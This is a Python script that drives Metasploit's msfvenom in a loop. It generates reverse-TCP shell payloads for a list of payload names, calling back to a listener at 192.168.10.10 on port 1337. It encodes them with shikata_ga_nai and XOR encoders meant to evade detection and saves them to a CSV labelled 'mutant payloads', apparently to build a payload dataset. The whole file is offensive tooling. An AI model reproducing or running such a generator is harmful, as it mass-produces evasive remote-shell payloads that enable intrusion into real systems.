import subprocess
from pymetasploit3.msfrpc import MsfRpcClient
passd = input("Enter password: ")
client = MsfRpcClient(passd, port=55552, ssh=True)
res = subprocess.Popen(f"msfvenom LHOST=192.168.10.10 LPORT=1337 --payload windows/shell/reverse_tcp", shell=True, stdout=subprocess.PIPE).communicate()[0]
file = open("examplemutantpayloads.csv", "wb")
with open("exploitnames.txt", "r") as f:
  x = f.readlines()
exploits = []
for i in x:
  exploits.append(i.split(' ')[0])
for exp in exploits:
  print(f"Extracting... {exp}")
  res = subprocess.Popen(f"msfvenom LHOST=192.168.10.10 LPORT=1337 --payload {exp} --encoder x86/shikata_ga_nai", shell=True, stdout=subprocess.PIPE).communicate()[0]
  if res is None:
    continue
  payload = res
  file.write(exp.encode() + b"," + payload + b"\n")
for exp in exploits:
  print(f"Extracting... {exp}")
  res = subprocess.Popen(f"msfvenom LHOST=192.168.10.10 LPORT=1337 --payload {exp} --encoder x64/xor", shell=True, stdout=subprocess.PIPE).communicate()[0]
  if res is None:
    continue
  payload = res
  file.write(exp.encode() + b"," + payload + b"\n")
file.close()
